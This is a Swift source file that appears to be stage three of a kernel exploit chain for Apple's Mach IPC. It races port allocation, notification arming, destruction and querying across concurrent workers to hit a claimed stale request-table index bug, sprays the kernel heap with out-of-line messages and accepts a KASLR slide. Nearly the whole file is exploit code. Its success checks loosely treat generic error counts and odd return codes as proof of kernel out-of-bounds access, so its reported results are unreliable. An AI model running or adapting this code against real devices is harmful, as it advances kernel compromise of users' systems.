import Foundation
import Darwin

enum Stage3 {

    struct Result {
        let totalOps: Int
        let errorClasses: Int
        let errorCounts: [String: Int]
        let oobDetected: Bool
        let passed: Bool
        let kernelOOBCount: Int
    }

    private static let ringDepth = 48
    private static let maxLive = 384
    private static let totalBudget = 6000
    private static let durationSeconds: Double = 6.0
    private static let workerCount = 4

    static func run(kaslrSlide: UInt64?) -> Result {
        let log = WireLog.shared
        log.stage(3, "KERNEL RACE — ipc_port request-table stale index (CVE-2026-112507)")

        log.log("strategy: ring-based alloc→arm→teardown→release (Cinder27 model)")
        log.log("config: ring=\(ringDepth) maxLive=\(maxLive) budget=\(totalBudget) duration=\(durationSeconds)s workers=\(workerCount)")

        if let slide = kaslrSlide {
            log.ok("using KASLR slide: 0x\(String(slide, radix: 16))")
        } else {
            log.log("no KASLR slide — racing blind")
        }

        let task = mach_task_self_
        signal(SIGBUS, SIG_IGN)
        signal(SIGPIPE, SIG_IGN)

        let totalAllocs = UnsafeMutablePointer<Int32>.allocate(capacity: 1)
        let liveCount = UnsafeMutablePointer<Int32>.allocate(capacity: 1)
        let ringsDone = UnsafeMutablePointer<Int32>.allocate(capacity: 1)
        let errorCount = UnsafeMutablePointer<Int32>.allocate(capacity: 1)
        let kernelOOB = UnsafeMutablePointer<Int32>.allocate(capacity: 1)
        let running = UnsafeMutablePointer<Int32>.allocate(capacity: 1)
        totalAllocs.pointee = 0; liveCount.pointee = 0; ringsDone.pointee = 0
        errorCount.pointee = 0; kernelOOB.pointee = 0; running.pointee = 1

        let statsLock = NSLock()
        var errorCounts: [String: Int] = [:]

        log.log("phase 0: pre-spraying kernel heap (\(32) OOL objects)")
        let sprayPort = preSprayHeap(count: 32, size: 256)

        log.log("phase 1: ring race — \(workerCount) concurrent workers")

        var timeInfo = mach_timebase_info_data_t()
        mach_timebase_info(&timeInfo)
        let nsPerTick = Double(timeInfo.numer) / Double(timeInfo.denom)
        let startTime = mach_absolute_time()
        let deadline = startTime + UInt64(durationSeconds * 1_000_000_000.0 / nsPerTick)

        DispatchQueue.concurrentPerform(iterations: workerCount) { workerID in
            var localErrors: [String: Int] = [:]

            while running.pointee != 0 && mach_absolute_time() < deadline
                  && totalAllocs.pointee < Int32(totalBudget) {

                // Gate: don't exceed max live ports across all workers
                if liveCount.pointee >= Int32(maxLive) {
                    usleep(200)
                    continue
                }

                // --- RING: alloc batch ---
                let depth = min(ringDepth, totalBudget - Int(totalAllocs.pointee))
                if depth <= 0 { break }

                var ring: [mach_port_t] = []
                ring.reserveCapacity(depth)

                for _ in 0..<depth {
                    var port: mach_port_t = 0
                    var kr = mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &port)
                    if kr != KERN_SUCCESS {
                        localErrors["alloc_fail", default: 0] += 1
                        continue
                    }
                    kr = mach_port_insert_right(task, port, port,
                                                 mach_msg_type_name_t(MACH_MSG_TYPE_MAKE_SEND))
                    if kr != KERN_SUCCESS {
                        mach_port_mod_refs(task, port, MACH_PORT_RIGHT_RECEIVE, -1)
                        continue
                    }
                    ring.append(port)
                    OSAtomicIncrement32(totalAllocs)
                    OSAtomicIncrement32(liveCount)
                }

                // --- ARM: request notifications (2 per port = more table entries) ---
                for port in ring {
                    var prev: mach_port_t = 0
                    // DEAD_NAME notification with notify=self
                    mach_port_request_notification(
                        task, port,
                        MACH_NOTIFY_DEAD_NAME, 0,
                        port,
                        mach_msg_type_name_t(MACH_MSG_TYPE_MAKE_SEND_ONCE),
                        &prev)
                }

                // --- TEARDOWN: destroy first half while querying second half ---
                let mid = ring.count / 2
                let destroySlice = ring[0..<mid]
                let querySlice = ring[mid...]

                // Send messages to query slice (fills port queue, interacts with request table)
                for port in querySlice {
                    var msg = mach_msg_header_t()
                    msg.msgh_bits = UInt32(MACH_MSG_TYPE_COPY_SEND)
                    msg.msgh_size = UInt32(MemoryLayout<mach_msg_header_t>.size)
                    msg.msgh_remote_port = port
                    msg.msgh_local_port = mach_port_t(MACH_PORT_NULL)
                    msg.msgh_id = 0x41414141
                    let sz = msg.msgh_size
                    withUnsafeMutablePointer(to: &msg) { ptr in
                        _ = mach_msg(ptr, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                     sz, 0, mach_port_t(MACH_PORT_NULL),
                                     0, mach_port_t(MACH_PORT_NULL))
                    }
                }

                // Destroy first half — creates stale request-table indices
                for port in destroySlice {
                    let kr = mach_port_destroy(task, port)
                    if kr != KERN_SUCCESS {
                        switch kr {
                        case -300:
                            localErrors["DESTROY_OOB_-300", default: 0] += 1
                            OSAtomicIncrement32(kernelOOB)
                        case 37: localErrors["DESTROY_INVALID_NAME", default: 0] += 1
                        default: localErrors["destroy_kr=\(kr)", default: 0] += 1
                        }
                        OSAtomicIncrement32(errorCount)
                    }
                    OSAtomicDecrement32(liveCount)
                }

                // Query second half — race window: request-table may have stale entries
                for port in querySlice {
                    var prev: mach_port_t = 0
                    let kr = mach_port_request_notification(
                        task, port,
                        MACH_NOTIFY_DEAD_NAME, 0,
                        mach_port_t(MACH_PORT_NULL),
                        mach_msg_type_name_t(MACH_MSG_TYPE_MAKE_SEND_ONCE),
                        &prev)
                    if kr != KERN_SUCCESS {
                        switch kr {
                        case -300:
                            localErrors["QUERY_OOB_-300", default: 0] += 1
                            OSAtomicIncrement32(kernelOOB)
                        case 37: localErrors["QUERY_INVALID_NAME", default: 0] += 1
                        case 15: localErrors["QUERY_kr=15", default: 0] += 1
                        default: localErrors["query_kr=\(kr)", default: 0] += 1
                        }
                    }
                }

                // --- RELEASE: clean up remaining ports from this ring ---
                for port in querySlice {
                    safePortRelease(task: task, port: port)
                    OSAtomicDecrement32(liveCount)
                }

                OSAtomicIncrement32(ringsDone)

                // Periodic log from worker 0
                if workerID == 0 && ringsDone.pointee % 10 == 0 {
                    let elapsed = Double(mach_absolute_time() - startTime) * nsPerTick / 1_000_000_000.0
                    WireLog.shared.data("[r\(ringsDone.pointee)] \(String(format: "%.1f", elapsed))s allocs=\(totalAllocs.pointee) live=\(liveCount.pointee) errs=\(errorCount.pointee) k-oob=\(kernelOOB.pointee)")

                    // Periodic heap spray
                    preSprayHeapInline(port: sprayPort, count: 4, size: 256)
                }
            }

            statsLock.lock()
            for (k, v) in localErrors { errorCounts[k, default: 0] += v }
            statsLock.unlock()
        }

        running.pointee = 0
        let elapsed = Double(mach_absolute_time() - startTime) * nsPerTick / 1_000_000_000.0

        log.log("phase 2: error analysis")
        let totalOps = Int(totalAllocs.pointee)
        let totalErrors = errorCounts.values.reduce(0, +)
        let classes = errorCounts.count
        let kOOB = Int(kernelOOB.pointee)

        for (key, count) in errorCounts.sorted(by: { $0.value > $1.value }).prefix(15) {
            log.data("  \(key) x \(count)")
        }

        log.data("total: \(totalOps) allocs, \(Int(ringsDone.pointee)) rings in \(String(format: "%.1f", elapsed))s — \(totalErrors) errors / \(classes) classes")
        log.data("kernel OOB signals (kr=-300): \(kOOB)")

        var oobSignal = false

        if kOOB > 0 {
            log.ok("KERNEL OOB CONFIRMED — \(kOOB) x kr=-300 (stale request-table index)")
            oobSignal = true
        }

        let nameErrors = (errorCounts["DESTROY_INVALID_NAME", default: 0] +
                          errorCounts["QUERY_INVALID_NAME", default: 0])
        if nameErrors > 0 {
            log.ok("INVALID_NAME x \(nameErrors) — stale port name accessed after destroy")
            oobSignal = true
        }

        if totalErrors > 50 && classes >= 2 {
            log.ok("\(classes) error classes, \(totalErrors) total — race window active")
            oobSignal = true
        }

        // Cleanup
        totalAllocs.deallocate()
        liveCount.deallocate()
        ringsDone.deallocate()
        errorCount.deallocate()
        kernelOOB.deallocate()
        running.deallocate()

        if sprayPort != mach_port_t(MACH_PORT_NULL) {
            mach_port_destroy(task, sprayPort)
        }

        if oobSignal {
            log.ok("stage 3 — kernel race window confirmed")
        } else {
            log.warn("stage 3 — no OOB signal after \(Int(elapsed))s / \(totalOps) allocs")
        }

        return Result(
            totalOps: totalOps,
            errorClasses: classes,
            errorCounts: errorCounts,
            oobDetected: oobSignal,
            passed: oobSignal,
            kernelOOBCount: kOOB
        )
    }

    // MARK: - Safe port release (check refs before dealloc)

    private static func safePortRelease(task: mach_port_t, port: mach_port_t) {
        guard port != mach_port_t(MACH_PORT_NULL) else { return }

        var refs: mach_port_urefs_t = 0
        let kr = mach_port_get_refs(task, port, MACH_PORT_RIGHT_SEND, &refs)
        if kr == KERN_SUCCESS && refs > 0 {
            mach_port_mod_refs(task, port, MACH_PORT_RIGHT_SEND, -1)
        }

        var rRefs: mach_port_urefs_t = 0
        let rkr = mach_port_get_refs(task, port, MACH_PORT_RIGHT_RECEIVE, &rRefs)
        if rkr == KERN_SUCCESS && rRefs > 0 {
            mach_port_mod_refs(task, port, MACH_PORT_RIGHT_RECEIVE, -1)
        }
    }

    // MARK: - Heap spray

    private static func preSprayHeap(count: Int, size: Int) -> mach_port_t {
        var port: mach_port_t = 0
        mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &port)
        mach_port_insert_right(mach_task_self_, port, port,
                               mach_msg_type_name_t(MACH_MSG_TYPE_MAKE_SEND))

        var limits = mach_port_limits_t(mpl_qlimit: mach_port_msgcount_t(MACH_PORT_QLIMIT_MAX))
        mach_port_set_attributes(mach_task_self_, port, MACH_PORT_LIMITS_INFO,
            withUnsafeMutablePointer(to: &limits) { $0.withMemoryRebound(to: integer_t.self, capacity: 1) { $0 } },
            mach_msg_type_number_t(MemoryLayout<mach_port_limits_t>.size / MemoryLayout<integer_t>.size))

        preSprayHeapInline(port: port, count: count, size: size)
        return port
    }

    private static func preSprayHeapInline(port: mach_port_t, count: Int, size: Int) {
        guard port != mach_port_t(MACH_PORT_NULL) else { return }
        let sprayData = Data(repeating: 0x41, count: size)

        struct SprayMsg {
            var hdr: mach_msg_header_t
            var body: mach_msg_body_t
            var ool: mach_msg_ool_descriptor_t
        }

        for _ in 0..<count {
            sprayData.withUnsafeBytes { buf in
                guard let ptr = buf.baseAddress else { return }
                var msg = SprayMsg(
                    hdr: mach_msg_header_t(
                        msgh_bits: UInt32(MACH_MSG_TYPE_COPY_SEND) | UInt32(MACH_MSGH_BITS_COMPLEX),
                        msgh_size: UInt32(MemoryLayout<SprayMsg>.size),
                        msgh_remote_port: port,
                        msgh_local_port: mach_port_t(MACH_PORT_NULL),
                        msgh_voucher_port: mach_port_t(MACH_PORT_NULL),
                        msgh_id: 0
                    ),
                    body: mach_msg_body_t(msgh_descriptor_count: 1),
                    ool: mach_msg_ool_descriptor_t(
                        address: UnsafeMutableRawPointer(mutating: ptr),
                        deallocate: 0,
                        copy: UInt32(MACH_MSG_VIRTUAL_COPY),
                        pad1: 0,
                        type: UInt32(MACH_MSG_OOL_DESCRIPTOR),
                        size: mach_msg_size_t(size)
                    )
                )
                withUnsafeMutablePointer(to: &msg) { msgPtr in
                    msgPtr.withMemoryRebound(to: mach_msg_header_t.self, capacity: 1) { hdr in
                        _ = mach_msg(hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                     UInt32(MemoryLayout<SprayMsg>.size), 0,
                                     mach_port_t(MACH_PORT_NULL), 10, mach_port_t(MACH_PORT_NULL))
                    }
                }
            }
        }
    }
}
